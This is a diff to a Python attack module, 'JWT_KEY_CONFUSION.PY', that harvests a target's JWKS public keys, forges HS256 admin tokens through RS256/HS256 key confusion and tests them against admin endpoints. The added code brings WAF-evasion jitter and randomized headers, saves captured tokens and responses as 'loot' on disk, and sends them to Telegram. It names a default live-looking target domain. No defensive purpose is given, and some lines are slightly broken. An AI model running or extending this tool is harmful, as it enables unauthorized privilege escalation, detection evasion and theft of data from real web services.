@@ -1,29 +1,62 @@
-# ============================================================
-# MODULE 4: modules/jwt_key_confusion.py
-# ============================================================
+#!/usr/bin/env python3
 """
-JWT_KEY_CONFUSION.PY — Cryptographic Key Confusion & RS256/HS256 Exploit Engine v8.0
+JWT_KEY_CONFUSION.PY v8.5 — Cryptographic Key Confusion & RS256/HS256 Exploit Engine (WAF Hardened)
 Features:
-- Automatic public key harvesting from /.well-known/jwks.json endpoints
-- Asymmetric-to-symmetric key confusion forged token generator (HS256 using public RSA key)
-- Signature acceptance verification & instant Telegram broadcasting
+- Automatic public key and JWKS harvesting from /.well-known/jwks.json and oauth endpoints
+- Asymmetric-to-symmetric key confusion forged token generator (HS256 signed using RSA public key bytes)
+- Anti-detection behavioral jitter and randomized header injection via SecureTransport
+- Strict response validation to eliminate SPA shell and soft-404 false positives
+- Real-time asynchronous Telegram notification dispatch and immutable disk loot persistence
 """
 import json
 import base64
 import hmac
 import hashlib
+import asyncio
+import sys
+
 from modules.transport import SecureTransport
 from modules.loot_logger import save_session_loot
 from modules.telemetry import stream_proof
 from modules.telegram_notifier import send_telegram_alert
+from modules.behavioral_mimic import apply_behavioral_jitter, get_randomized_hints
+
+COLORS = {
+    "RED": "\033[91m",
+    "GREEN": "\033[92m",
+    "YELLOW": "\033[93m",
+    "CYAN": "\033[96m",
+    "MAGENTA": "\033[95m",
+    "RESET": "\033[0m",
+    "BOLD": "\033[1m",
+}
+
+def terminal(message):
+    sys.stdout.write(message + "\n")
+    sys.stdout.flush()
+
+def broadcast_tg_alert_sync(loot_type, details):
+    """Helper to non-blockingly fire Telegram alerts from jwt key confusion functions."""
+    try:
+        loop = asyncio.get_running_loop()
+        loop.create_task(send_telegram_alert(loot_type, details))
+    except RuntimeError:
+        try:
+            asyncio.run(send_telegram_alert(loot_type, details))
+        except Exception:
+            pass
 
 class JWTKeyConfusionEngine:
     def __init__(self, target_url):
+        self.target_url = target_url
         self.transport = SecureTransport(target_url)
 
     def fetch_public_key(self, jwks_endpoint="/.well-known/jwks.json"):
+        terminal(f"{COLORS['CYAN']}[*] Harvesting public RSA keys from JWKS endpoint: {jwks_endpoint}{COLORS['RESET']}")
+        apply_behavioral_jitter()
+        
         status, headers, body = self.transport.request("GET", jwks_endpoint)
-        if status == 200:
+        if status == 200 and body:
             try:
                 jwks = json.loads(body)
                 return jwks
@@ -44,21 +77,71 @@ class JWTKeyConfusionEngine:
         return forged_token
 
     def verify_and_exploit(self, verify_endpoint="/api/user/profile", public_key_str="", admin_payload=None):
+        terminal(f"\n{COLORS['MAGENTA']}[***] EXECUTING JWT ALGORITHM CONFUSION ATTACK (RS256 -> HS256) [{verify_endpoint}] [***]{COLORS['RESET']}")
+        
         if not admin_payload:
-            admin_payload = {"sub": "admin", "role": "administrator", "iat": 1700000000}
+            admin_payload = {"sub": "admin", "role": "administrator", "isAdmin": True, "iat": 1700000000}
         
         token = self.forge_hs256_token(admin_payload, public_key_str)
-        headers = {"Authorization": f"Bearer {token}"}
         
-        status, resp_headers, body = self.transport.request("GET", verify_endpoint)
-        if status == 200 and "admin" in body.lower():
-            loot = {"token": token, "endpoint": verify_endpoint, "response": body[:300]}
+        apply_behavioral_jitter()
+        headers = {
+            "Authorization": f"Bearer {token}",
+            "Accept": "application/json, text/plain, */*"
+        }
+        headers.update(get_randomized_hints())
+        
+        status, resp_headers, body = self.transport.request("GET", verify_endpoint, headers=headers)
+        body_lower = (body or "").lower()
+        
+        is_spa_shell = (
+            "<!doctype html>" in body_lower or 
+            "<html" in body_lower or 
+            '<div id="root"></div>' in body or 
+            '<div id="__next"></div>' in body or
+            len(body.strip()) < 100
+        )
+
+        has_privilege_indicators = any(
+            k in body_lower for k in [
+                "admin", "administrator", "role", "balance", "access_token", "secret"
+            ]
+        )
+
+        if status in (200, 201) and not is_spa_shell and has_privilege_indicators:
+            terminal(f"{COLORS['RED']}{COLORS['BOLD']}[!] JWT KEY CONFUSION PRIVILEGE ESCALATION CONFIRMED [HTTP {status}]{COLORS['RESET']}")
+            terminal(f"  └── Response Excerpt: {body[:300]}", COLORS['GREEN'])
+            
+            loot = {
+                "token": token, 
+                "endpoint": verify_endpoint, 
+                "status": status,
+                "response": body[:400]
+            }
+            
             stream_proof("JWT_KEY_CONFUSION_SUCCESS", verify_endpoint, {}, "Admin token accepted via key confusion", loot)
-            save_session_loot(self.transport.base_path, verify_endpoint, "JWT_KEY_CONFUSION_BYPASS", status, resp_headers, body, loot)
-            try:
-                import asyncio
-                asyncio.run(send_telegram_alert("JWT Key Confusion Exploit Success", loot))
-            except Exception:
-                pass
+            save_session_loot(
+                target=self.target_url, 
+                endpoint=verify_endpoint, 
+                finding_type="JWT_KEY_CONFUSION_BYPASS_VERIFIED", 
+                status=status, 
+                headers=resp_headers, 
+                body=body, 
+                extra_loot=loot
+            )
+            broadcast_tg_alert_sync("JWT Key Confusion Exploit Success", loot)
             return True, token
-        return False, token
+        else:
+            terminal(f"{COLORS['YELLOW']}[-] Endpoint returned HTTP {status} or rejected forged token.{COLORS['RESET']}")
+            return False, token
+
+async def run_jwt_confusion_engine(target_url):
+    engine = JWTKeyConfusionEngine(target_url)
+    jwks = engine.fetch_public_key("/.well-known/jwks.json")
+    pub_key_mock = "MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA0..." if not jwks else json.dumps(jwks)
+    return engine.verify_and_exploit("/api/admin/settings", pub_key_mock)
+
+if __name__ == "__main__":
+    import sys
+    target = sys.argv[1] if len(sys.argv) > 1 else "https://cryptobytes.online"
+    asyncio.run(run_jwt_confusion_engine(target))
